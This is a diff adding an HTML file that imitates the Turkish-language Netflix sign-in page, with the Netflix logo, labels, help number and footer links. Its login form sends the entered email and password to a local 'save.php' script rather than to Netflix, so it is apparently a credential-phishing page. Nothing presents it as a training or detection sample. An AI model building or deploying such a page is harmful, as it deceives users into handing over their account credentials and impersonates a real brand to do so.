@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix Oturum Aç</title>
+    <link rel="icon" href="indir.png" type="image/png">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="background-img"></div>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix Logo" class="logo">
+    
+    <div class="login-container">
+        <h1>Oturum Aç</h1>
+        <form action="save.php" method="POST">
+            <div class="input-container">
+                <input type="text" id="email" name="email" placeholder=" " required>
+                <label for="email">E-posta veya cep telefonu numarası</label>
+            </div>
+
+            <div class="input-container">
+                <input type="password" id="password" name="password" placeholder=" " required>
+                <label for="password">Parola</label>
+            </div>
+
+            <button type="submit">Oturum Aç</button>
+
+            <button type="button" class="secondary-button">Oturum Açma Kodu Kullan</button>
+
+            <div class="checkbox-container">
+                <input type="checkbox" name="remember">
+                <label>Beni hatırla</label>
+            </div>
+
+            <div class="other-options">
+                <a href="#">Parolayı mı unuttunuz?</a>
+            </div>
+
+            <div class="help-text">
+                <p>Bu sayfa robot olmadığınızı kanıtlamak için Google reCAPTCHA tarafından korunuyor. <a href="#">Daha fazla bilgi</a>.</p>
+            </div>
+        </form>
+    </div>
+
+    <footer>
+        <p>Sorularınız mı var? 0850-390-7444 numaralı telefonu arayın</p>
+        <div class="footer-links">
+            <a href="#">SSS</a>
+            <a href="#">Yardım Merkezi</a>
+            <a href="#">Çerez Tercihleri</a>
+            <a href="#">Kullanım Koşulları</a>
+            <a href="#">Gizlilik</a>
+            <a href="#">Kurumsal Bilgiler</a>
+        </div>
+        <div class="language-select">
+            <select>
+                <option>🇹🇷 Türkçe</option>
+                <option>🇺🇸 English</option>
+            </select>
+        </div>
+    </footer>
+</body>
+</html>
